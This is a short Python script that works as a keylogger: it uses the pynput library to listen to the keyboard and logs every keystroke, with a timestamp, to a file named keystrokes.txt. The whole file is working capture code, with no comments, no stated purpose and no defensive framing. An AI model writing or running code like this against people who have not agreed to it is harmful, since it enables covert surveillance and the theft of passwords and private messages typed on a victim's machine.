import os
import logging
from pynput import keyboard
from pynput.keyboard import Key,Listener

log_directory = ""

logging.basicConfig(filename=(log_directory + "keystrokes.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()